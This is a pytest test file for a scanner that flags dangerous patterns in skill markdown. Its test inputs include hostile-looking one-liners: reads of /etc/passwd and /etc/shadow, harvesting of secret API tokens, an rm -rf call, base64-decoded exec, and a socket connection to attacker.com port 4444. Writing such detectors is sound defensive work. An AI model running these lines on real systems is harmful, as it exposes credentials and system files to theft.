"""Skill scanner — pattern detection unit tests."""

from __future__ import annotations

import pytest

from app.boundary.skill_scanner import (
    Category,
    Severity,
    has_blocking_findings,
    scan,
    to_dict_list,
)

# ─── Clean content ───────────────────────────────────────────────────


@pytest.mark.unit
def test_clean_skill_no_findings():
    """A normal skill markdown has zero findings."""
    body = """# Outline Skill

Use this skill to generate a chapter outline.

```yaml
inputs:
  - story_premise: string
```

Output is markdown with H2 chapter headings.
"""
    assert scan(body) == []


@pytest.mark.unit
def test_safe_python_in_docs_no_findings():
    """Documentation that mentions safe APIs is fine."""
    body = """## Example

```python
import json
data = json.loads(input_text)
print(data['title'])
```
"""
    assert scan(body) == []


# ─── dangerous_exec ─────────────────────────────────────────────────


@pytest.mark.unit
def test_os_system_flagged():
    body = "result = os.system('rm -rf /tmp/foo')"
    findings = scan(body)
    assert any(
        f.category == Category.DANGEROUS_EXEC and f.severity == Severity.HIGH
        for f in findings
    )


@pytest.mark.unit
def test_eval_flagged():
    body = "x = eval('1+2')"
    findings = scan(body)
    assert any(f.category == Category.DANGEROUS_EXEC for f in findings)


@pytest.mark.unit
def test_exec_flagged():
    body = "exec(user_supplied_code)"
    assert any(f.category == Category.DANGEROUS_EXEC for f in scan(body))


@pytest.mark.unit
def test_subprocess_shell_true_flagged():
    body = "subprocess.run(cmd, shell=True)"
    findings = scan(body)
    assert any(
        f.category == Category.DANGEROUS_EXEC and "shell=True" in f.message
        for f in findings
    )


@pytest.mark.unit
def test_subprocess_without_shell_not_flagged():
    """The safe form (args list, no shell=True) is OK."""
    body = "subprocess.run(['ls', '-la'])"
    findings = scan(body)
    # No dangerous_exec hit (we only flag shell=True variant)
    assert not any(
        f.category == Category.DANGEROUS_EXEC and "subprocess" in f.snippet
        for f in findings
    )


@pytest.mark.unit
def test_dynamic_import_os_flagged():
    body = "m = __import__('subprocess')"
    findings = scan(body)
    assert any(f.category == Category.DANGEROUS_EXEC for f in findings)


@pytest.mark.unit
def test_pickle_loads_flagged():
    body = "obj = pickle.loads(untrusted_bytes)"
    findings = scan(body)
    assert any(f.category == Category.DANGEROUS_EXEC for f in findings)


# ─── env_harvesting ────────────────────────────────────────────────


@pytest.mark.unit
def test_secret_env_read_flagged():
    body = "key = os.environ['OPENAI_API_KEY']"
    findings = scan(body)
    assert any(f.category == Category.ENV_HARVESTING for f in findings)


@pytest.mark.unit
def test_getenv_secret_flagged():
    body = "tok = os.getenv('GITHUB_TOKEN')"
    findings = scan(body)
    assert any(f.category == Category.ENV_HARVESTING for f in findings)


@pytest.mark.unit
def test_non_secret_env_not_flagged():
    """LANG, HOME, PATH are normal — should NOT flag."""
    body = """home = os.environ['HOME']
lang = os.getenv('LANG', 'en_US')"""
    findings = scan(body)
    assert not any(f.category == Category.ENV_HARVESTING for f in findings)


@pytest.mark.unit
def test_full_env_dict_snapshot_flagged():
    body = "snap = dict(os.environ)"
    findings = scan(body)
    assert any(f.category == Category.ENV_HARVESTING for f in findings)


# ─── fs_escape ─────────────────────────────────────────────────────


@pytest.mark.unit
def test_etc_passwd_open_flagged():
    body = "with open('/etc/passwd') as f: data = f.read()"
    findings = scan(body)
    assert any(f.category == Category.FS_ESCAPE for f in findings)


@pytest.mark.unit
def test_etc_path_object_flagged():
    body = "p = Path('/etc/shadow')"
    findings = scan(body)
    assert any(f.category == Category.FS_ESCAPE for f in findings)


@pytest.mark.unit
def test_relative_path_open_not_flagged():
    body = "with open('./data/local.json') as f: x = f.read()"
    findings = scan(body)
    assert not any(f.category == Category.FS_ESCAPE for f in findings)


# ─── network_exfil ─────────────────────────────────────────────────


@pytest.mark.unit
def test_socket_create_connection_flagged():
    body = "s = socket.create_connection(('attacker.com', 4444))"
    findings = scan(body)
    assert any(f.category == Category.NETWORK_EXFIL for f in findings)


@pytest.mark.unit
def test_urllib_flagged():
    body = "import urllib.request\nurllib.request.urlopen(url)"
    findings = scan(body)
    assert any(f.category == Category.NETWORK_EXFIL for f in findings)


# ─── obfuscation ───────────────────────────────────────────────────


@pytest.mark.unit
def test_base64_then_exec_flagged():
    body = """payload = base64.b64decode('aW1wb3J0IG9z')
exec(payload)"""
    findings = scan(body)
    assert any(f.category == Category.OBFUSCATION for f in findings)


@pytest.mark.unit
def test_hex_decode_then_exec_flagged():
    body = "exec(bytes.fromhex('70617373').decode())"
    findings = scan(body)
    # Hex pattern OR the eval line pattern should fire
    assert any(
        f.category in (Category.OBFUSCATION, Category.DANGEROUS_EXEC) for f in findings
    )


@pytest.mark.unit
def test_long_base64_blob_warned():
    """A long base64-looking string (>=200 chars) flags as WARN."""
    body = "blob = '" + "A" * 250 + "'"
    findings = scan(body)
    obf = [f for f in findings if f.category == Category.OBFUSCATION]
    assert len(obf) == 1
    assert obf[0].severity == Severity.WARN


@pytest.mark.unit
def test_long_b64_capped_at_3_reports():
    body = "\n".join(f"x{i} = '" + "B" * 220 + "'" for i in range(10))
    findings = scan(body)
    obf = [f for f in findings if f.category == Category.OBFUSCATION]
    assert len(obf) <= 3


# ─── Sorting + serialization ───────────────────────────────────────


@pytest.mark.unit
def test_findings_sorted_high_severity_first():
    body = (
        """blob = '"""
        + "B" * 220
        + """'
exec(payload)"""
    )
    findings = scan(body)
    severities = [f.severity for f in findings]
    # All HIGH come before all WARN
    high_indices = [i for i, s in enumerate(severities) if s == Severity.HIGH]
    warn_indices = [i for i, s in enumerate(severities) if s == Severity.WARN]
    if high_indices and warn_indices:
        assert max(high_indices) < min(warn_indices)


@pytest.mark.unit
def test_to_dict_list_shape():
    body = "exec('hi')"
    out = to_dict_list(scan(body))
    assert len(out) >= 1
    assert set(out[0].keys()) == {"line", "category", "severity", "snippet", "message"}


@pytest.mark.unit
def test_has_blocking_findings_true_when_high():
    body = "os.system('x')"
    assert has_blocking_findings(scan(body)) is True


@pytest.mark.unit
def test_has_blocking_findings_false_for_warn_only():
    body = "blob = '" + "A" * 250 + "'"
    findings = scan(body)
    # All findings are WARN severity
    assert all(f.severity != Severity.HIGH for f in findings)
    assert has_blocking_findings(findings) is False


@pytest.mark.unit
def test_empty_content_no_crash():
    assert scan("") == []
    assert scan("\n\n\n") == []


@pytest.mark.unit
def test_snippet_truncated_at_120_chars():
    body = "exec('" + "x" * 200 + "')"
    findings = scan(body)
    assert findings
    assert len(findings[0].snippet) <= 121  # +1 for the ellipsis
